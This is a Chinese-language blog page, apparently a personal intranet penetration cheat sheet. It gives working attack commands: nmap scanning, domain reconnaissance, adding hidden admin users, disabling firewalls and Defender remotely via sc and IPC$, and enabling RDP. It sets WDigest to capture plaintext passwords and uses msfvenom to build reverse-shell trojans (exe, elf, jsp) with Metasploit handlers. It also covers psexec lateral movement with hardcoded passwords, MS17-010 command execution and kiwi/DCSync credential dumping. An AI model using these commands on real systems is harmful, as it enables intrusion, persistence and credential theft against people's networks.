                        <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81" aria-label="权限维持">权限维持</a><ul>
                            
                    <li>
                        <a href="#%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae" aria-label="黄金票据">黄金票据</a></li>
                    <li>
                        <a href="#sid-history%e5%9f%9f%e5%90%8e%e9%97%a8" aria-label="SID History域后门">SID History域后门</a></li>
                    <li>
                        <a href="#dsrm-%e5%90%8e%e9%97%a8" aria-label="DSRM 后门">DSRM 后门</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e6%8f%90%e6%9d%83" aria-label="提权">提权</a><ul>
                            
                    <li>
                        <a href="#linux%e6%8f%90%e5%8f%96%e6%94%be%e8%a1%8c%e6%99%ae%e9%80%9a%e7%94%a8%e6%88%b7%e6%8f%90%e6%9d%83" aria-label="Linux提取放行普通用户提权">Linux提取放行普通用户提权</a></li>
                    <li>
                        <a href="#suid-ps%e7%a8%8b%e5%ba%8f%e6%8f%90%e6%9d%83" aria-label="suid ps程序提权">suid ps程序提权</a></li>
                    <li>
                        <a href="#linux-ssh%e5%85%8d%e7%99%bb%e5%bd%95%e6%96%b9%e5%bc%8f" aria-label="linux ssh免登录方式">linux ssh免登录方式</a>
                    </li>
                </ul>
                </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><h1 id="内网渗透">内网渗透<a hidden class="anchor" aria-hidden="true" href="#内网渗透">#</a></h1>
<h2 id="kali">Kali<a hidden class="anchor" aria-hidden="true" href="#kali">#</a></h2>
<h3 id="探测命令">探测命令<a hidden class="anchor" aria-hidden="true" href="#探测命令">#</a></h3>
<ol>
<li>
<p>netdiscover</p>
<ul>
<li><code>netdiscover -i eth0 -r 192.168.111.0/24</code> 探测网卡下同段存在主机</li>
</ul>
</li>
<li>
<p>namp</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap 192.168.111.129`   # 探测存在的服务
</span></span><span class="line"><span class="cl">nmap -T4 -sC -sV 192.168.1.8 
</span></span><span class="line"><span class="cl">-p: 指定端口扫描范围
</span></span><span class="line"><span class="cl">-F：扫描比缺省少的端口
</span></span><span class="line"><span class="cl">-A：使能系统探测、版本检测、脚本扫描、路由追踪
</span></span><span class="line"><span class="cl">-O：探测指定IP的相关数据。
</span></span><span class="line"><span class="cl">-sP：主机探测
</span></span><span class="line"><span class="cl">-sL:列出需要扫描的目标，不扫描
</span></span><span class="line"><span class="cl">-sn:只做ping扫描，不做端口扫描
</span></span><span class="line"><span class="cl">-Pn：跳过主机发现，视所有主机都在线
</span></span><span class="line"><span class="cl">-PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现
</span></span><span class="line"><span class="cl">-PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现
</span></span><span class="line"><span class="cl">-PO[Protocol list]：基于IP协议字段的ping扫描
</span></span><span class="line"><span class="cl">-n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析
</span></span><span class="line"><span class="cl">--dns-servers &lt;serv1[,serv2],...&gt;: 指定DNS 服务器
</span></span><span class="line"><span class="cl">--system-dns:调用系统的DNS服务器
</span></span><span class="line"><span class="cl">--traceroute：显示追踪到目标的路径
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-sS/sT/sA/sW/sM:TCP扫描
</span></span><span class="line"><span class="cl">-sS是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放
</span></span><span class="line"><span class="cl">-sT是全连接扫描会和服务器建立完整的三次握手，效率低
</span></span><span class="line"><span class="cl">-sA发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件
</span></span><span class="line"><span class="cl">-sW 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包
</span></span><span class="line"><span class="cl">-sM是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准
</span></span><span class="line"><span class="cl">-sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文
</span></span><span class="line"><span class="cl">-sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。
</span></span><span class="line"><span class="cl">-sY/sZ:SCTP协议INIT或cookie-echo扫描
</span></span><span class="line"><span class="cl">-sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测
</span></span><span class="line"><span class="cl">-b &lt;FTP relay host&gt;:：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的
</span></span></code></pre></div></li>
</ol>
<h2 id="linux">Linux<a hidden class="anchor" aria-hidden="true" href="#linux">#</a></h2>
<h3 id="常见命令">常见命令<a hidden class="anchor" aria-hidden="true" href="#常见命令">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uname -a    # 获取所有版本信息
</span></span><span class="line"><span class="cl">uname -m    # 获取Linux内核架构
</span></span><span class="line"><span class="cl">cat /proc/version    # 获取内核信息 
</span></span><span class="line"><span class="cl">cat /etc/*-release   # 发布信息
</span></span><span class="line"><span class="cl">cat /etc/issue    # 发布信息
</span></span><span class="line"><span class="cl">hostname    # 获取主机名
</span></span><span class="line"><span class="cl">cat /etc/passwd    # 列出系统所有用户 
</span></span><span class="line"><span class="cl">cat /etc/group    # 列出系统所有组 
</span></span><span class="line"><span class="cl">w    # 查看目前登录的用户
</span></span><span class="line"><span class="cl">whoami    # 查看当前用户 
</span></span><span class="line"><span class="cl">id    # 查看当前用户信息 
</span></span><span class="line"><span class="cl">sudo -l    # 列出目前用户可执行与无法执行的指令 
</span></span><span class="line"><span class="cl">ps aux    # 查看进程信息 
</span></span><span class="line"><span class="cl">ls -la /etc/cron*    # 查看计划任务
</span></span><span class="line"><span class="cl">ifconfig -a    # 列出网络接口信息 
</span></span><span class="line"><span class="cl">cat /etc/network/interfaces    # 列出网络接口信息 
</span></span><span class="line"><span class="cl">arp -a    # 查看系统arp表 
</span></span><span class="line"><span class="cl">route    # 打印路由信息
</span></span><span class="line"><span class="cl">netstat -anplt    # 打印本地端口开放信息 
</span></span><span class="line"><span class="cl">iptables -L    # 列出iptable的配置规则
</span></span><span class="line"><span class="cl">nohup 命令 &amp; #后台运行
</span></span></code></pre></div><h2 id="windows">Windows<a hidden class="anchor" aria-hidden="true" href="#windows">#</a></h2>
<h3 id="初步收集">初步收集<a hidden class="anchor" aria-hidden="true" href="#初步收集">#</a></h3>
<ol>
<li>查看基本信息命令</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> ipconfig /all   # 查看本机ip，所在域
</span></span><span class="line"><span class="cl"> route print     # 打印路由信息
</span></span><span class="line"><span class="cl"> net view        # 查看局域网内其他主机名
</span></span><span class="line"><span class="cl"> net view /domain # 查看主域信息
</span></span><span class="line"><span class="cl"> arp -a          # 查看arp缓存
</span></span><span class="line"><span class="cl"> net start       # 查看开启了哪些服务
</span></span><span class="line"><span class="cl"> net share       # 查看开启了哪些共享
</span></span><span class="line"><span class="cl"> net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
</span></span><span class="line"><span class="cl"> echo %PROCESSOR_ARCHITECTURE%    // 查看系统体系结构
</span></span><span class="line"><span class="cl"> systeminfo    // 查看操作系统信息
</span></span><span class="line"><span class="cl"> nslookup god.org		#nslookup直接解析域名服务器
</span></span><span class="line"><span class="cl"> net user                 # 查看本机用户列表
</span></span><span class="line"><span class="cl"> net user /domain         # 查看域用户
</span></span><span class="line"><span class="cl"> net localgroup administrators    # 查看本地管理员组（通常会有域用户）
</span></span><span class="line"><span class="cl"> net computers # 查看连接的电脑
</span></span><span class="line"><span class="cl"> net view /domain         # 查看有几个域
</span></span><span class="line"><span class="cl"> net user &#34;用户名&#34; /domain   # 获取指定域用户的信息
</span></span><span class="line"><span class="cl"> net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
</span></span><span class="line"><span class="cl"> net group &#34;组名&#34; /domain    # 查看域中某工作组
</span></span><span class="line"><span class="cl"> net group &#34;domain admins&#34; /domain  # 查看域管理员的名字
</span></span><span class="line"><span class="cl"> net group &#34;domain computers&#34; /domain  # 查看域中的其他主机名
</span></span><span class="line"><span class="cl"> net group &#34;doamin controllers&#34; /domain  # 查看域控制器（可能有多台）
</span></span><span class="line"><span class="cl"> net group &#34;Enterprise Admins&#34; /domain    // 查看域管理员组
</span></span><span class="line"><span class="cl"> net accounts /domain  #查看域密码信息
</span></span><span class="line"><span class="cl"> nltest /domain_trusts #查看域信任信息
</span></span></code></pre></div><ol start="2">
<li>net添加用户</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net user &#34;username&#34; &#34;password&#34; /add  #添加账户名和密码的用户, 不用双引号也可以
</span></span><span class="line"><span class="cl">net localgroup administrators &#34;username&#34; /add #将用户添加到本地管理员中
</span></span></code></pre></div><ol start="3">
<li>net共享盘符连接</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net use         # 查看与本机的共享链接
</span></span><span class="line"><span class="cl">net view \\IP      #查看远程主机开启的默认共享
</span></span><span class="line"><span class="cl">net share       # 查看本机开启了哪些共享
</span></span><span class="line"><span class="cl">net share ipc$  # 开启本机ipc共享
</span></span><span class="line"><span class="cl">net share c$    # 开启本机c盘共享
</span></span><span class="line"><span class="cl">net use \\IP\ipc$ &#34;password&#34; /user:&#34;username&#34;  #建立空连接
</span></span><span class="line"><span class="cl">net use z: \\IP\c$ &#34;password&#34; /user:&#34;username&#34;  #建立共享盘符
</span></span><span class="line"><span class="cl">net use \\IP\ipc$ /del #删除空连接
</span></span><span class="line"><span class="cl">net use z: /del #删除本机映射的z盘 
</span></span><span class="line"><span class="cl">net use * /del #删除本机所有映射和IPC$连接 
</span></span><span class="line"><span class="cl">dir \\192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目
</span></span><span class="line"><span class="cl">录下的文件
</span></span><span class="line"><span class="cl">copy mimikatz.exe \\192.168.138.138\c$  #复制文件到目标ip的c盘下面
</span></span></code></pre></div><ol start="4">
<li>计划任务</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">schtasks /query /tn taskName #查看计划任务，不加/tn为所有计划任务
</span></span><span class="line"><span class="cl">schtasks /create /tn &#34;taskName&#34; /tr C:\shell.exe /sc once /st 18:05 /S 192.168.52.138 /RU System /RL HIGHEST /u administrator /p &#34;Liu78963&#34;   #创建计划任务，18:05分启动，就启动一次，计划任务名称为taskName
</span></span><span class="line"><span class="cl">schtasks /delete /tn taskName #删除计划任务
</span></span></code></pre></div><ol start="5">
<li>netstat 查看端口是否开放</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netstat -ano | find &#34;3389&#34;
</span></span></code></pre></div><ol start="6">
<li>开启3389命令</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
</span></span></code></pre></div><ol start="7">
<li>查看进程并删除</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tasklist | findstr &#34;artifact&#34;
</span></span><span class="line"><span class="cl">taskkill /pid 2888 -f
</span></span></code></pre></div><ol start="8">
<li>
<p>关闭防火墙</p>
<ul>
<li>本地关闭</li>
</ul>
</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netsh advfirewall set allprofiles state off  
</span></span><span class="line"><span class="cl">net stop windefend
</span></span><span class="line"><span class="cl">netsh advfirewall firewall set rule group=&#34;Remote Desktop&#34; new enable=yes #防火墙设置白名单
</span></span></code></pre></div><pre><code>- 远程关闭
</code></pre>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net use \\192.168.93.10\ipc$ &#34;dc123.com&#34; /user:&#34;administrator&#34;
</span></span><span class="line"><span class="cl">sc \\192.168.93.10 create unablefirewall binpath= &#34;netsh advfirewall set allprofiles state off&#34;
</span></span><span class="line"><span class="cl">sc \\192.168.93.10 start unablefirewall
</span></span><span class="line"><span class="cl">net use \\192.168.93.10\ipc$ /del
</span></span></code></pre></div><ol start="9">
<li>开启远程桌面</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1  #开启远程桌面功能
</span></span></code></pre></div><ol start="10">
<li>
<p>程序异常弹窗解决</p>
<ul>
<li>关闭所有程序异常弹窗</li>
</ul>
</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v &#34;DontShowUI&#34; /t REG_DWORD /d 1 /f
</span></span><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v &#34;Disabled&#34; /t REG_DWORD /d 1 /f
</span></span><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v &#34;LoggingDisabled&#34; /t REG_DWORD /d 1 /f
</span></span><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v &#34;DontSendAdditionalData&#34; /t REG_DWORD /d 1 /f
</span></span></code></pre></div><pre><code>- 开启所有程序异常弹窗
</code></pre>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg delete &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v DontShowUI /f
</span></span><span class="line"><span class="cl">reg delete &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v Disabled /f
</span></span><span class="line"><span class="cl">reg delete &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v LoggingDisabled /f
</span></span><span class="line"><span class="cl">reg delete &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v DontSendAdditionalData /f
</span></span></code></pre></div><blockquote>
<p><strong>注意</strong>：win7下的弹窗错误程序为WerFault.exe，使用计划任务不会出现弹窗错误</p>
</blockquote>
<ol start="11">
<li>wmic命令执行</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net use \\192.168.7.7\ipc$ &#34;1qaz@WSX&#34; /user:administrator #建立ipc链接
</span></span><span class="line"><span class="cl">wmic /node:192.168.7.7 process call create &#34;cmd.exe /c ipconfig &gt;c:\ip.txt&#34; #执行cmd命令并将结果保存在txt文档中
</span></span><span class="line"><span class="cl">type \\192.168.7.7\C$\ip.txt  #查看执行结果
</span></span><span class="line"><span class="cl">或
</span></span><span class="line"><span class="cl">wmic /node:192.168.7.7 /user:administrator /password:1qaz@WSX1qaz@WSX process call create &#34;cmd /c ipconfig &gt; c:\1.txt&#34;
</span></span></code></pre></div><ol start="12">
<li>启用dsrm登录</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">New-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34; -name &#34;DsrmAdminLogonBehavior&#34; -value 2 -propertyType DWORD #powershell
</span></span><span class="line"><span class="cl">或
</span></span><span class="line"><span class="cl">reg add &#34;HKLM\System\CurrentControlSet\Control\Lsa&#34; /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
</span></span></code></pre></div><ol start="13">
<li>修改注册表抓明文(win10或2012R2以上，未验证）</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg add HKLM/SYSTEM/CurrentControlSet/Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
</span></span></code></pre></div><ul>
<li>
<h3 id="其他命令">其他命令<a hidden class="anchor" aria-hidden="true" href="#其他命令">#</a></h3>
</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netsh winsock reset #重启网络
</span></span></code></pre></div><h3 id="横向移动">横向移动<a hidden class="anchor" aria-hidden="true" href="#横向移动">#</a></h3>
<ol>
<li>ping扫描</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &#34;TTL=&#34;   用Ping命令探测内网主机
</span></span></code></pre></div><h2 id="msf">MSF<a hidden class="anchor" aria-hidden="true" href="#msf">#</a></h2>
<h3 id="msf生成windows木马命令">MSF生成Windows木马命令<a hidden class="anchor" aria-hidden="true" href="#msf生成windows木马命令">#</a></h3>
<ol>
<li>反向链接木马<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.131 lport=6000 -f exe &gt;shell.exe</code></li>
<li>反向链接木马操作</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">msfconsole</span>
</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lhost</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>   <span class="c1">#设置监听ip，必须和frpc中的local_ip 一致</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">2222</span>        <span class="c1">#设置监听端口，与frpc中的local_port一致</span>
</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
</span></span></code></pre></div><h3 id="msf生成linux木马命令">MSF生成Linux木马命令<a hidden class="anchor" aria-hidden="true" href="#msf生成linux木马命令">#</a></h3>
<ol>
<li>反向链接木马</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=4444 -f elf &gt; shell.elf
</span></span></code></pre></div><ol start="2">
<li>反向链接木马操作</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">msfconsole</span>
</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">linux</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lhost</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>   <span class="c1">#设置监听ip，必须和frpc中的local_ip 一致</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">2222</span>        <span class="c1">#设置监听端口，与frpc中的local_port一致</span>
</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
</span></span></code></pre></div><h3 id="msf生成linux系统的java网站木马命令">MSF生成Linux系统的Java网站木马命令<a hidden class="anchor" aria-hidden="true" href="#msf生成linux系统的java网站木马命令">#</a></h3>
<ol>
<li>木马<code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=2222 -f jsp &gt; shell.jsp</code></li>
<li>链接操作</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">msfconsole</span>
</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">linux</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lhost</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>   <span class="c1">#设置监听ip，必须和frpc中的local_ip 一致</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">2222</span>        <span class="c1">#设置监听端口，与frpc中的local_port一致</span>
</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
</span></span></code></pre></div><h3 id="msf常见命令">MSF常见命令<a hidden class="anchor" aria-hidden="true" href="#msf常见命令">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">getuid</span>   <span class="c1">#获取当前账号权限</span>
</span></span><span class="line"><span class="cl"><span class="n">getsystem</span> <span class="c1">#获取system权限</span>
</span></span><span class="line"><span class="cl"><span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">enable_rdp</span> <span class="c1">#关闭windows防火墙</span>
</span></span><span class="line"><span class="cl"><span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">smart_hashdump</span> <span class="err">获取</span><span class="n">window哈希</span>
</span></span><span class="line"><span class="cl"><span class="n">run</span> <span class="n">autoroute</span> <span class="o">-</span><span class="n">s</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">52.0</span><span class="o">/</span><span class="mi">24</span> <span class="c1">#添加路由，在木马上使用</span>
</span></span><span class="line"><span class="cl"><span class="n">autoroute</span> <span class="o">-</span><span class="n">p</span> <span class="c1">#查看路由，在密码上使用</span>
</span></span><span class="line"><span class="cl"><span class="n">route</span> <span class="n">add</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">138.0</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span> <span class="mi">1</span> <span class="c1">#添加路由在msf上使用</span>
</span></span><span class="line"><span class="cl"><span class="n">route</span> <span class="nb">print</span>    <span class="c1">#查看路由在msf上使用</span>
</span></span><span class="line"><span class="cl"><span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_patches</span> <span class="c1">#查看补丁情况</span>
</span></span><span class="line"><span class="cl"><span class="n">setg</span> <span class="n">Proxies</span> <span class="n">socks5</span><span class="p">:</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">1080</span> <span class="c1">#设置代理</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span> <span class="n">options</span> <span class="n">lhost</span> <span class="c1">#显示lhost的设置</span>
</span></span></code></pre></div><h3 id="psexec传递-确保已经设置好路由">psexec传递 （确保已经设置好路由）<a hidden class="anchor" aria-hidden="true" href="#psexec传递-确保已经设置好路由">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">rhost</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">SMBUser</span> <span class="n">administrator</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">SMBPass</span> <span class="mi">1</span><span class="n">qaz</span><span class="err">@</span><span class="n">WSX</span>
</span></span><span class="line"><span class="cl"><span class="n">run</span>
</span></span></code></pre></div><h3 id="msf使用ms17-010开启3389">MSF使用ms17-010开启3389<a hidden class="anchor" aria-hidden="true" href="#msf使用ms17-010开启3389">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/admin/smb/ms17_010_command
</span></span><span class="line"><span class="cl">set COMMAND REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&#34; \&#34;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f 
</span></span><span class="line"><span class="cl">set rhost x.x.x.x
</span></span></code></pre></div><h3 id="msf使用mimikatz被kiwi取代">MSF使用mimikatz（被kiwi取代）<a hidden class="anchor" aria-hidden="true" href="#msf使用mimikatz被kiwi取代">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">migrate</span> <span class="p">[</span><span class="n">PID</span><span class="p">]</span>   <span class="c1">#如果是x64需要这个步骤</span>
</span></span><span class="line"><span class="cl"><span class="nb">load</span> <span class="n">kiwi</span> <span class="c1">#加载模块</span>
</span></span><span class="line"><span class="cl"><span class="n">help</span> <span class="n">kiwi</span> <span class="c1">#查看帮助</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">creds_all</span><span class="err">：列举所有凭据</span>
</span></span><span class="line"><span class="cl"><span class="n">creds_kerberos</span><span class="err">：列举所有</span><span class="n">kerberos凭据</span>
</span></span><span class="line"><span class="cl"><span class="n">creds_msv</span><span class="err">：列举所有</span><span class="n">msv凭据</span>
</span></span><span class="line"><span class="cl"><span class="n">creds_ssp</span><span class="err">：列举所有</span><span class="n">ssp凭据</span>
</span></span><span class="line"><span class="cl"><span class="n">creds_tspkg</span><span class="err">：列举所有</span><span class="n">tspkg凭据</span>
</span></span><span class="line"><span class="cl"><span class="n">creds_wdigest</span><span class="err">：列举所有</span><span class="n">wdigest凭据</span>
</span></span><span class="line"><span class="cl"><span class="n">dcsync</span><span class="err">：通过</span><span class="n">DCSync检索用户帐户信息</span>
</span></span><span class="line"><span class="cl"><span class="n">dcsync_ntlm</span><span class="err">：通过</span><span class="n">DCSync检索用户帐户NTLM散列</span><span class="err">、</span><span class="n">SID和RID</span>
